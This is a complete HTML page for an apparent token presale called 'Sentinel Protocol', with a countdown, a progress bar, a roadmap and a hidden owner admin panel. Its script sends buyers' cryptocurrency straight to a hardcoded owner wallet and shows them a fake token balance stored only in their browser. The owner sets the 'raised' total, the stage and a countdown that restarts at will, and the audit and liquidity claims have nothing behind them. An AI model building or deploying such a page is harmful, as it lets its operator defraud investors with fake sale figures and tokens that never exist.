<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SENTINEL PROTOCOL | Advanced DeFi Security</title>
    
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 500'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%2300f2ff' /%3E%3Cstop offset='100%25' style='stop-color:%230066ff' /%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath d='M250 20 L450 100 L420 300 C400 400 300 480 250 500 C200 480 100 400 80 300 L50 100 Z' fill='%230b1221' stroke='url(%23g)' stroke-width='15' /%3E%3Ctext x='50%25' y='68%25' font-family='Arial' font-weight='bold' font-size='300' fill='white' text-anchor='middle'%3ES%3C/text%3E%3C/svg%3E">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Urbanist:wght@400;600;800&family=Chakra+Petch:wght@500;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary: #00f2ff;
            --secondary: #0066ff;
            --bg: #050914;
            --card-bg: rgba(15, 25, 45, 0.95);
            --border: 1px solid rgba(0, 242, 255, 0.2);
            --text-gray: #a0aec0;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Urbanist', sans-serif; scroll-behavior: smooth; }
        body { background: var(--bg); color: white; overflow-x: hidden; }
        
        /* SCROLLBAR */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: var(--secondary); border-radius: 4px; }

        /* HEADER */
        header { 
            position: fixed; top: 0; width: 100%; z-index: 999; 
            background: rgba(5, 9, 20, 0.9); backdrop-filter: blur(20px); border-bottom: var(--border);
            padding: 15px 5%; display: flex; justify-content: space-between; align-items: center;
        }
        .logo { display: flex; align-items: center; gap: 10px; font-family: 'Chakra Petch'; font-size: 1.5rem; font-weight: bold; color: white; text-decoration: none; }
        .logo img { height: 40px; }
        
        .nav-links { display: flex; gap: 25px; }
        .nav-links a { color: var(--text-gray); text-decoration: none; font-weight: 600; font-size: 0.9rem; transition: 0.3s; }
        .nav-links a:hover { color: var(--primary); }
        
        .lang-select { background: rgba(255,255,255,0.05); border: var(--border); color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer; outline: none; }
        .lang-select option { background: #000; color: white; }

        .btn-main { 
            background: linear-gradient(90deg, var(--secondary), var(--primary)); 
            color: #000; border: none; padding: 10px 25px; border-radius: 30px; 
            font-weight: 800; cursor: pointer; transition: 0.3s; font-family: 'Chakra Petch';
            box-shadow: 0 0 15px rgba(0, 242, 255, 0.3);
        }
        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 0 25px rgba(0, 242, 255, 0.6); }

        /* MOBILE MENU */
        .hamburger { display: none; font-size: 1.5rem; cursor: pointer; color: var(--primary); }
        
        /* HERO SECTION */
        .hero { 
            padding: 150px 5% 80px; display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 50px; align-items: center; max-width: 1400px; margin: 0 auto;
            background: radial-gradient(circle at 20% 20%, rgba(0, 102, 255, 0.15), transparent 50%);
        }
        .hero-content h1 { font-family: 'Chakra Petch'; font-size: 3.5rem; line-height: 1.1; margin-bottom: 20px; }
        .hero-content h1 span { color: var(--primary); background: -webkit-linear-gradient(0deg, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero-content p { color: var(--text-gray); font-size: 1.2rem; line-height: 1.6; margin-bottom: 30px; }
        
        /* PRESALE CARD (MAXIDOGE STYLE) */
        .presale-card { 
            background: var(--card-bg); border: var(--border); border-radius: 20px; padding: 35px; 
            box-shadow: 0 0 50px rgba(0,0,0,0.5); position: relative; overflow: hidden;
        }
        .presale-header { text-align: center; margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; }
        .presale-header h3 { font-family: 'Chakra Petch'; font-size: 1.8rem; }
        .presale-header p { color: var(--primary); font-weight: bold; }

        .timer-grid { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
        .t-box { background: #0b1221; border: 1px solid #2d3748; padding: 10px; border-radius: 8px; min-width: 65px; text-align: center; }
        .t-num { font-size: 1.5rem; font-weight: bold; display: block; color: white; font-family: 'Chakra Petch'; }
        .t-lbl { font-size: 0.7rem; color: var(--text-gray); }

        .progress-container { margin-bottom: 25px; }
        .progress-info { display: flex; justify-content: space-between; font-size: 0.9rem; margin-bottom: 8px; }
        .progress-bar { height: 15px; background: #0b1221; border-radius: 10px; overflow: hidden; border: 1px solid #2d3748; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--secondary), var(--primary)); width: 0%; transition: 1s; }

        .curr-tabs { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
        .curr-tab { 
            background: rgba(255,255,255,0.03); border: 1px solid transparent; padding: 10px; 
            border-radius: 8px; cursor: pointer; text-align: center; font-weight: bold; font-size: 0.8rem;
            display: flex; align-items: center; justify-content: center; gap: 5px; color: var(--text-gray);
        }
        .curr-tab.active { background: rgba(0, 242, 255, 0.15); border-color: var(--primary); color: white; }
        .curr-tab img { width: 20px; }

        .swap-inputs { display: flex; flex-direction: column; gap: 10px; }
        .input-group { 
            background: #0b1221; border: 1px solid #2d3748; padding: 15px; border-radius: 10px; 
            display: flex; justify-content: space-between; align-items: center; 
        }
        .input-group label { color: var(--text-gray); font-size: 0.8rem; display: block; }
        .input-group input { 
            background: transparent; border: none; color: white; text-align: right; 
            font-size: 1.4rem; font-family: 'Chakra Petch'; width: 60%; outline: none; 
        }

        .buy-btn { width: 100%; padding: 18px; margin-top: 20px; font-size: 1.1rem; }
        .buy-btn:disabled { background: #333; cursor: not-allowed; box-shadow: none; color: #777; }

        /* TOKENOMICS & ROADMAP */
        .section { padding: 80px 5%; max-width: 1200px; margin: 0 auto; text-align: center; }
        .sec-title { font-family: 'Chakra Petch'; font-size: 2.5rem; margin-bottom: 50px; }
        .sec-title span { color: var(--primary); }

        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 50px; }
        .stat-card { background: var(--card-bg); padding: 25px; border-radius: 15px; border: var(--border); }
        .stat-num { font-size: 2rem; font-weight: bold; color: var(--primary); font-family: 'Chakra Petch'; }

        .roadmap-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; text-align: left; }
        .r-card { 
            background: rgba(255,255,255,0.03); padding: 25px; border-radius: 15px; border-left: 3px solid #333; 
            transition: 0.3s; opacity: 0.5;
        }
        .r-card.active { border-left-color: var(--primary); opacity: 1; background: linear-gradient(90deg, rgba(0,242,255,0.05), transparent); }
        .r-card h4 { color: var(--primary); margin-bottom: 10px; font-family: 'Chakra Petch'; }
        .r-card ul { list-style: none; padding-left: 10px; }
        .r-card ul li { margin-bottom: 5px; font-size: 0.9rem; color: #ccc; }
        .r-card ul li::before { content: "• "; color: var(--primary); }

        /* ADMIN PANEL (HIDDEN) */
        #adminPanel { 
            display: none; position: fixed; bottom: 0; left: 0; width: 100%; z-index: 10000;
            background: #000; border-top: 3px solid #ff4444; padding: 20px; 
            box-shadow: 0 -10px 50px rgba(0,0,0,0.8);
        }
        .adm-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; color: #ff4444; font-weight: bold; }
        .adm-controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; }
        .adm-input { background: #1a1a1a; border: 1px solid #333; color: white; padding: 10px; width: 100%; border-radius: 5px; }
        .adm-btn { padding: 10px; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; width: 100%; }
        
        /* RESPONSIVE */
        @media (max-width: 992px) {
            .hero { grid-template-columns: 1fr; text-align: center; padding-top: 100px; }
            .nav-links { display: none; }
            .hamburger { display: block; }
            .presale-card { max-width: 500px; margin: 0 auto; }
        }
    </style>
</head>
<body>

    <div id="adminPanel">
        <div class="adm-header">
            <span>⚠️ ADMIN CONTROLS (Changes are Auto-Saved)</span>
            <button onclick="document.getElementById('adminPanel').style.display='none'" style="background:none; border:none; color:#666; cursor:pointer;">X</button>
        </div>
        <div class="adm-controls">
            <div><small>Token Price ($)</small><input id="admPrice" type="number" class="adm-input" value="0.03"></div>
            <div><small>Raised ($)</small><input id="admRaised" type="number" class="adm-input" value="450000"></div>
            <div><small>Target ($)</small><input id="admTarget" type="number" class="adm-input" value="5000000"></div>
            <div><small>End Date (YYYY-MM-DD)</small><input id="admDate" type="date" class="adm-input"></div>
            <div><small>Current Stage (1-4)</small><input id="admStage" type="number" class="adm-input" value="1"></div>
            <button onclick="saveAdmin()" class="adm-btn" style="background:green; color:white; margin-top:18px;">SAVE & UPDATE</button>
            <button id="pauseBtn" onclick="togglePause()" class="adm-btn" style="background:orange; color:black; margin-top:18px;">PAUSE SALE</button>
        </div>
    </div>

    <header>
        <a href="#" class="logo">
            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 500 500'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' style='stop-color:%2300f2ff' /%3E%3Cstop offset='100%25' style='stop-color:%230066ff' /%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath d='M250 20 L450 100 L420 300 C400 400 300 480 250 500 C200 480 100 400 80 300 L50 100 Z' fill='none' stroke='url(%23g)' stroke-width='30' /%3E%3Ctext x='50%25' y='68%25' font-family='Arial' font-weight='bold' font-size='300' fill='white' text-anchor='middle'%3ES%3C/text%3E%3C/svg%3E">
            SENTINEL
        </a>
        
        <nav class="nav-links">
            <a href="#home" data-lang="nav_home">Home</a>
            <a href="#about" data-lang="nav_about">About</a>
            <a href="#tokenomics" data-lang="nav_token">Tokenomics</a>
            <a href="#roadmap" data-lang="nav_road">Roadmap</a>
            <a href="#faq" data-lang="nav_faq">FAQ</a>
        </nav>

        <div style="display:flex; gap:10px; align-items:center;">
            <select class="lang-select" onchange="changeLang(this.value)">
                <option value="en">EN</option>
                <option value="tr">TR</option>
                <option value="de">DE</option>
                <option value="fr">FR</option>
                <option value="ar">AR</option>
            </select>
            <button id="conBtn" class="btn-main" onclick="connectWallet()">CONNECT</button>
            <div id="addrDisplay" style="display:none; color:var(--primary); font-weight:bold; font-family:'Chakra Petch'; cursor:pointer;" onclick="location.reload()">0x...</div>
            <i class="fa fa-bars hamburger"></i>
        </div>
    </header>

    <div class="hero" id="home">
        <div class="hero-content">
            <h1 data-lang="hero_title">THE FUTURE OF <br><span>DEFI SECURITY</span></h1>
            <p data-lang="hero_desc">Sentinel Protocol is the world's first decentralized inheritance and vault system. Protect your assets with military-grade encryption.</p>
            <div style="display:flex; gap:15px; flex-wrap:wrap;">
                <button class="btn-main" onclick="document.getElementById('presale').scrollIntoView()" data-lang="hero_btn1">BUY PRESALE</button>
                <button style="background:transparent; border:1px solid white; color:white; padding:10px 25px; border-radius:30px; cursor:pointer;" data-lang="hero_btn2">WHITEPAPER</button>
            </div>
            <div style="margin-top:40px; opacity:0.7; display:flex; gap:20px;">
                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" height="30">
                <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" height="30">
                <img src="https://cryptologos.cc/logos/polygon-matic-logo.png" height="30">
                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" height="30">
            </div>
        </div>

        <div class="presale-card" id="presale">
            <div class="presale-header">
                <h3 data-lang="pre_title">PRESALE STAGE 1</h3>
                <p id="saleStatus">ENDS IN</p>
            </div>

            <div class="timer-grid">
                <div class="t-box"><span class="t-num" id="d">00</span><span class="t-lbl">DAYS</span></div>
                <div class="t-box"><span class="t-num" id="h">00</span><span class="t-lbl">HRS</span></div>
                <div class="t-box"><span class="t-num" id="m">00</span><span class="t-lbl">MIN</span></div>
                <div class="t-box"><span class="t-num" id="s">00</span><span class="t-lbl">SEC</span></div>
            </div>

            <div class="progress-container">
                <div class="progress-info">
                    <span id="txtRaised">Raised: $450,000</span>
                    <span id="txtTarget">Target: $5,000,000</span>
                </div>
                <div class="progress-bar"><div id="pBar" class="progress-fill" style="width:10%"></div></div>
                <div style="text-align:center; margin-top:5px; font-size:0.8rem; color:#aaa;">1 SNTL = <span id="txtPrice" style="color:white; font-weight:bold;">$0.03</span></div>
            </div>

            <div class="curr-tabs">
                <div class="curr-tab active" onclick="setCurr('eth', this)"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.png"> ETH</div>
                <div class="curr-tab" onclick="setCurr('bnb', this)"><img src="https://cryptologos.cc/logos/bnb-bnb-logo.png"> BNB</div>
                <div class="curr-tab" onclick="setCurr('matic', this)"><img src="https://cryptologos.cc/logos/polygon-matic-logo.png"> MATIC</div>
                <div class="curr-tab" onclick="setCurr('usdt', this)"><img src="https://cryptologos.cc/logos/tether-usdt-logo.png"> USDT</div>
            </div>

            <div class="swap-inputs">
                <div class="input-group">
                    <div>
                        <label data-lang="pay_label">YOU PAY</label>
                        <span id="currLabel" style="font-weight:bold; color:var(--primary);">ETH</span>
                    </div>
                    <input type="number" id="amtIn" placeholder="0" oninput="calc()">
                </div>
                <div class="input-group">
                    <div>
                        <label data-lang="get_label">YOU GET</label>
                        <span style="font-weight:bold; color:var(--primary);">SNTL</span>
                    </div>
                    <input type="number" id="amtOut" readonly placeholder="0">
                </div>
            </div>

            <button id="buyBtn" class="btn-main buy-btn" onclick="buyTokens()">CONNECT WALLET FIRST</button>
            
            <div id="userDash" style="display:none; margin-top:20px; background:rgba(0,255,100,0.1); border:1px solid #00ff88; padding:15px; border-radius:10px; text-align:center;">
                <div style="font-size:0.8rem; color:#00ff88;">YOUR SNTL BALANCE</div>
                <div id="myBal" style="font-size:1.5rem; font-weight:bold;">0</div>
            </div>
        </div>
    </div>

    <div class="section">
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-num">500M</div>
                <p>Total Supply</p>
            </div>
            <div class="stat-card">
                <div class="stat-num">$0.15</div>
                <p>Listing Price</p>
            </div>
            <div class="stat-card">
                <div class="stat-num">Liquidity</div>
                <p>Locked 2 Years</p>
            </div>
        </div>
    </div>

    <div class="section" id="roadmap">
        <h2 class="sec-title">PROJECT <span>ROADMAP</span></h2>
        <div class="roadmap-grid">
            <div class="r-card active" id="st1">
                <h4>STAGE 1: FOUNDATION</h4>
                <ul><li>Concept Design</li><li>Website Launch</li><li>Private Sale</li><li>Smart Contract Audit</li></ul>
            </div>
            <div class="r-card" id="st2">
                <h4>STAGE 2: GROWTH</h4>
                <ul><li>Public Presale</li><li>Marketing Campaign</li><li>Community Building</li><li>CoinGecko Listing</li></ul>
            </div>
            <div class="r-card" id="st3">
                <h4>STAGE 3: LAUNCH</h4>
                <ul><li>DEX Listing (Uniswap)</li><li>Staking Platform</li><li>Token Distribution</li><li>CEX Listings</li></ul>
            </div>
            <div class="r-card" id="st4">
                <h4>STAGE 4: UTILITY</h4>
                <ul><li>Sentinel App Beta</li><li>Vault Integration</li><li>DAO Governance</li><li>Global Expansion</li></ul>
            </div>
        </div>
    </div>

    <script>
        const OWNER_ADDRESS = "0xd81f6b82683b4b8a2a08998dBcf33ebC5498715D"; 
        
        let state = {
            price: 0.03,
            raised: 450000,
            target: 5000000,
            endDate: new Date(new Date().getTime() + 5 * 24 * 60 * 60 * 1000).toISOString().split('T')[0],
            stage: 1,
            paused: false,
            curr: 'eth'
        };

        const rates = { eth: 2600, bnb: 600, matic: 0.8, usdt: 1 };
        let account = null;
        let myTokens = 0;

        // DICTIONARY
        const langData = {
            en: { nav_home:"Home", nav_about:"About", nav_road:"Roadmap", hero_title:"THE FUTURE OF <br><span>DEFI SECURITY</span>", hero_desc:"World's first decentralized inheritance protocol.", hero_btn1:"BUY PRESALE", pre_title:"PRESALE STAGE 1", pay_label:"YOU PAY", get_label:"YOU GET" },
            tr: { nav_home:"Ana Sayfa", nav_about:"Hakkında", nav_road:"Yol Haritası", hero_title:"DEFI GÜVENLİĞİNİN <br><span>GELECEĞİ</span>", hero_desc:"Dünyanın ilk merkeziyetsiz miras protokolü.", hero_btn1:"ÖN SATIŞTAN AL", pre_title:"ÖN SATIŞ 1. AŞAMA", pay_label:"ÖDENECEK", get_label:"ALINACAK" },
            de: { nav_home:"Startseite", nav_about:"Über", nav_road:"Fahrplan", hero_title:"DIE ZUKUNFT DER <br><span>DEFI-SICHERHEIT</span>", hero_desc:"Das weltweit erste dezentrale Erbschaftsprotokoll.", hero_btn1:"VORVERKAUF KAUFEN", pre_title:"VORVERKAUF STUFE 1", pay_label:"SIE ZAHLEN", get_label:"SIE ERHALTEN" },
            fr: { nav_home:"Accueil", nav_about:"À propos", nav_road:"Feuille de route", hero_title:"L'AVENIR DE LA <br><span>SÉCURITÉ DEFI</span>", hero_desc:"Premier protocole d'héritage décentralisé.", hero_btn1:"ACHETER MAINTENANT", pre_title:"PRÉVENTE ÉTAPE 1", pay_label:"VOUS PAYEZ", get_label:"VOUS OBTENEZ" },
            ar: { nav_home:"الرئيسية", nav_about:"حول", nav_road:"الخارطة", hero_title:"مستقبل <br><span>أمان التمويل اللامركزي</span>", hero_desc:"أول بروتوكول ميراث لامركزي في العالم.", hero_btn1:"شراء الآن", pre_title:"المرحلة 1", pay_label:"أنت تدفع", get_label:"أنت تحصل" }
        };

        // INIT
        window.onload = () => {
            loadState();
            updateUI();
            startTimer();
            
            // Check stored balance
            let bal = localStorage.getItem('sntl_balance');
            if(bal) myTokens = parseFloat(bal);
        };

        // ADMIN FUNCTIONS
        function loadState() {
            if(localStorage.getItem('sntl_state')) {
                state = JSON.parse(localStorage.getItem('sntl_state'));
                
                // Populate Admin Inputs
                document.getElementById('admPrice').value = state.price;
                document.getElementById('admRaised').value = state.raised;
                document.getElementById('admTarget').value = state.target;
                document.getElementById('admDate').value = state.endDate;
                document.getElementById('admStage').value = state.stage;
                updatePauseBtn();
            }
        }

        function saveAdmin() {
            state.price = parseFloat(document.getElementById('admPrice').value);
            state.raised = parseFloat(document.getElementById('admRaised').value);
            state.target = parseFloat(document.getElementById('admTarget').value);
            state.endDate = document.getElementById('admDate').value;
            state.stage = parseInt(document.getElementById('admStage').value);
            
            localStorage.setItem('sntl_state', JSON.stringify(state));
            updateUI();
            alert("System Updated Successfully!");
        }

        function togglePause() {
            state.paused = !state.paused;
            updatePauseBtn();
            updateUI();
            localStorage.setItem('sntl_state', JSON.stringify(state));
        }

        function updatePauseBtn() {
            const btn = document.getElementById('pauseBtn');
            btn.innerText = state.paused ? "RESUME SALE" : "PAUSE SALE";
            btn.style.background = state.paused ? "green" : "orange";
        }

        function updateUI() {
            document.getElementById('txtPrice').innerText = "$" + state.price;
            document.getElementById('txtRaised').innerText = "Raised: $" + state.raised.toLocaleString();
            document.getElementById('txtTarget').innerText = "Target: $" + state.target.toLocaleString();
            
            let percent = (state.raised / state.target) * 100;
            document.getElementById('pBar').style.width = percent + "%";

            // Roadmap Update
            for(let i=1; i<=4; i++) {
                const el = document.getElementById('st'+i);
                if(i <= state.stage) {
                    el.classList.add('active');
                    el.style.opacity = "1";
                } else {
                    el.classList.remove('active');
                    el.style.opacity = "0.5";
                }
            }

            // Button Logic
            const bBtn = document.getElementById('buyBtn');
            if(state.paused) {
                bBtn.innerText = "SALE PAUSED";
                bBtn.disabled = true;
            } else if (!account) {
                bBtn.innerText = "CONNECT WALLET FIRST";
                bBtn.disabled = false;
            } else {
                bBtn.innerText = "BUY TOKENS";
                bBtn.disabled = false;
            }
        }

        // TIMER LOGIC
        function startTimer() {
            setInterval(() => {
                const end = new Date(state.endDate).getTime();
                const now = new Date().getTime();
                const diff = end - now;

                if(diff > 0) {
                    document.getElementById('d').innerText = Math.floor(diff / (1000 * 60 * 60 * 24));
                    document.getElementById('h').innerText = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                    document.getElementById('m').innerText = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
                    document.getElementById('s').innerText = Math.floor((diff % (1000 * 60)) / 1000);
                } else {
                    document.getElementById('d').innerText = "00";
                }
            }, 1000);
        }

        // WALLET CONNECTION (DEEP LINKING FOR MOBILE)
        async function connectWallet() {
            // 1. Desktop Check
            if(window.ethereum) {
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    const accs = await provider.send("eth_requestAccounts", []);
                    handleLogin(accs[0]);
                } catch(e) { alert("User denied connection."); }
            } 
            // 2. Mobile Logic
            else {
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                if(isMobile) {
                    // Deep Link to MetaMask App
                    const url = window.location.href.split('//')[1];
                    window.location.href = "https://metamask.app.link/dapp/" + url;
                } else {
                    alert("Please install MetaMask extension!");
                    window.open("https://metamask.io/download", "_blank");
                }
            }
        }

        function handleLogin(addr) {
            account = addr;
            document.getElementById('conBtn').style.display = 'none';
            document.getElementById('addrDisplay').style.display = 'block';
            document.getElementById('addrDisplay').innerText = addr.substring(0,6) + "..." + addr.substring(38);
            
            // Check Admin
            if(addr.toLowerCase() === OWNER_ADDRESS.toLowerCase()) {
                document.getElementById('adminPanel').style.display = 'block';
            }
            
            // Show Balance
            document.getElementById('userDash').style.display = 'block';
            document.getElementById('myBal').innerText = myTokens.toLocaleString();
            updateUI();
        }

        // BUY & CALCULATION
        function setCurr(c, el) {
            state.curr = c;
            document.querySelectorAll('.curr-tab').forEach(t => t.classList.remove('active'));
            el.classList.add('active');
            document.getElementById('currLabel').innerText = c.toUpperCase();
            calc();
        }

        function calc() {
            const val = parseFloat(document.getElementById('amtIn').value);
            if(val > 0) {
                const tokens = (val * rates[state.curr]) / state.price;
                document.getElementById('amtOut').value = Math.floor(tokens).toLocaleString();
            } else {
                document.getElementById('amtOut').value = "";
            }
        }

        async function buyTokens() {
            if(!account) { connectWallet(); return; }
            const val = document.getElementById('amtIn').value;
            if(!val || val <= 0) return;

            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const tx = await signer.sendTransaction({
                    to: OWNER_ADDRESS,
                    value: ethers.utils.parseEther(val)
                });
                
                alert("Transaction Sent! Hash: " + tx.hash);
                
                // Simulate Balance Update
                const bought = (val * rates[state.curr]) / state.price;
                myTokens += bought;
                localStorage.setItem('sntl_balance', myTokens);
                document.getElementById('myBal').innerText = myTokens.toLocaleString();

            } catch(e) {
                console.error(e);
                alert("Transaction Failed or Cancelled.");
            }
        }

        // LANGUAGE
        function changeLang(lang) {
            const data = langData[lang];
            if(!data) return;
            
            document.querySelectorAll('[data-lang]').forEach(el => {
                const key = el.getAttribute('data-lang');
                if(data[key]) el.innerHTML = data[key];
            });

            if(lang === 'ar') document.body.style.direction = "rtl";
            else document.body.style.direction = "ltr";
        }
    </script>
</body>
</html>
